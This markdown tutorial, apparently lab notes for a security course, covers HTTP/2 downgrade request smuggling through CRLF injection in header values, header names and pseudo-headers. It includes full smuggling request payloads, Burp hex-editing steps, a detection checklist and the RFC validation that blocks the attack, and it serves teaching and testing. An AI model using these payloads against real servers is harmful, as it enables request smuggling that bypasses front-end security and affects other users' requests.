# 🎯 Advanced HTTP/2 Vulnerabilities

## Overview

Beyond simple H2.CL and H2.TE attacks, more complex vulnerabilities arise from **character handling differences** between HTTP/1.1 and HTTP/2.

---

## The Core Problem

### HTTP/1.1 vs HTTP/2 Character Handling

| Character | HTTP/1.1 | HTTP/2 |
|-----------|----------|--------|
| `\r\n` (CRLF) | **Terminates header** | No special meaning |
| `:` (colon) | **Separates name:value** | Allowed in values |
| Whitespace | Delimiter | Part of value |

### RFC 9113 Requirements

The HTTP/2 RFC mandates validation:

```
Field names MUST NOT contain:
- Characters 0x00-0x20 (non-visible + space)
- Uppercase A-Z (0x41-0x5a)
- 0x7f-0xff

Field values MUST NOT contain:
- NUL (0x00)
- LF (0x0a)
- CR (0x0d)
```

**If proxy doesn't validate → Injection possible!**

---

## 1. Request Header Injection

### Technique

Inject CRLF in header **value** to add new headers.

### HTTP/2 Request

```
:method         POST
:path           /
:authority      http2.htb
:scheme         https
dummy           asd\r\nTransfer-Encoding: chunked

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### After Rewrite to HTTP/1.1

```http
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### What Happened

| HTTP/2 | HTTP/1.1 |
|--------|----------|
| `dummy: asd\r\nTransfer-Encoding: chunked` | `Dummy: asd` |
| (single header) | `Transfer-Encoding: chunked` |
| | (two headers!) |

**Result**: H2.TE vulnerability created via header value injection.

---

## 2. Header Name Injection

### Technique

Inject CRLF in header **name** to add new headers.

### HTTP/2 Request

```
:method                              POST
:path                                /
:authority                           http2.htb
:scheme                              https
dummy: asd\r\nTransfer-Encoding      chunked

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### After Rewrite to HTTP/1.1

```http
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### What Happened

| HTTP/2 Header Name | HTTP/2 Value | HTTP/1.1 Result |
|-------------------|--------------|-----------------|
| `dummy: asd\r\nTransfer-Encoding` | `chunked` | `Dummy: asd` |
| | | `Transfer-Encoding: chunked` |

**Result**: Same H2.TE vulnerability, different injection point.

---

## 3. Request Line Injection (Pseudo-Header)

### Technique

Inject into **pseudo-headers** (`:method`, `:path`, etc.) which may bypass validation.

### Why Pseudo-Headers?

- Treated differently than regular headers
- Validation checks may not apply
- Directly construct HTTP/1.1 request line

### HTTP/2 Request

```
:method     POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
:path       /
:authority  http2.htb
:scheme     https

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### After Rewrite to HTTP/1.1

```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Dummy: asd / HTTP/1.1
Host: http2.htb
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

### What Happened

The `:method` value becomes the entire request line + injected headers:

```
:method value: "POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd"
                ↓
Request line:   POST / HTTP/1.1
Header 1:       Transfer-Encoding: chunked
Header 2:       Dummy: asd / HTTP/1.1  (path appended here)
```

**Result**: H2.TE via pseudo-header injection.

---

## Injection Points Summary

| Injection Point | Target | Example Payload |
|-----------------|--------|-----------------|
| **Header Value** | Regular header value | `dummy: asd\r\nTE: chunked` |
| **Header Name** | Regular header name | `dummy: x\r\nTE` + value `chunked` |
| **:method** | Pseudo-header | `POST / HTTP/1.1\r\nTE: chunked\r\nX: y` |
| **:path** | Pseudo-header | `/\r\nTE: chunked\r\nX: y` |
| **:authority** | Pseudo-header | `host\r\nTE: chunked` |

---

## Testing in Burp

### Inserting CRLF Characters

1. Switch to **Hex** view in Repeater
2. Find injection point
3. Insert:
   - `0d` = CR (`\r`)
   - `0a` = LF (`\n`)

### Example: Header Value Injection

```
Original:  dummy: test
Hex edit:  dummy: asd[0d][0a]Transfer-Encoding: chunked
```

### Viewing Pseudo-Headers

1. Open **Inspector** panel
2. Expand **Request Attributes**
3. Edit pseudo-header values directly

---

## Detection Checklist

Test each injection point:

- [ ] Regular header values (CRLF injection)
- [ ] Regular header names (CRLF injection)
- [ ] `:method` pseudo-header
- [ ] `:path` pseudo-header
- [ ] `:authority` pseudo-header
- [ ] `:scheme` pseudo-header

---

## Why These Work

### Vulnerable Proxy Behavior

```
1. Receives HTTP/2 request
2. Does NOT validate for forbidden characters
3. Blindly rewrites to HTTP/1.1
4. CRLF gains special meaning → headers injected
```

### Secure Proxy Behavior

```
1. Receives HTTP/2 request
2. Validates all headers per RFC
3. Rejects requests with CR/LF/NUL
4. No injection possible
```

---

## References

- [RFC 9113 - HTTP/2](https://httpwg.org/specs/rfc9113.html#rfc.section.8.2.1)
- [PortSwigger - HTTP/2 Request Smuggling](https://portswigger.net/research/http2)
- [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)

